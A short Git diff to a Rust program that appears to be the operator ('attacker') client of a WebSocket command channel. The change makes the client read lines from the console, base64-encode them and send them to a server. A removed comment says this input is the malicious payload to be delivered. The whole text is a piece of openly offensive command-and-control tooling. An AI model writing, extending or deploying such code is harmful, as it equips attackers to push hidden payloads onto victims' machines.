@@ -2,6 +2,15 @@ use tungstenite::{connect, Message};
 use base64::prelude::*;
 use rand::Rng;
 
+fn get_input() -> String {
+    let mut line = String::new();
+    let poss_err = std::io::stdin().read_line(&mut line);    
+    if poss_err.is_err() {
+        return String::from("");
+    } 
+    return line.parse().unwrap();
+}
+
 fn encode(inp : String) -> String {
     // base 64 encode 
     let inp = BASE64_STANDARD.encode(inp.into_bytes());
@@ -35,17 +44,13 @@ fn main() {
     socket.send(Message::text("attacker connected".to_string())).unwrap();
     
     loop {
-        let msg = socket.read().expect("Error reading message");        
-        println!(r#"Recieved: "{}""#, decode(msg.to_text().unwrap().to_string()));
+        let input = get_input().replace("\n", ""); 
+       
+        if input != "" {
+            let input = encode(input); 
+            socket.send(Message::text(input)).unwrap();
+        }
     
-        // get user input from console, this will be malicous payload, and then encode it, send to
-        // server
-
-           
-
-
-
-
     }
 
     // socket.close(None);
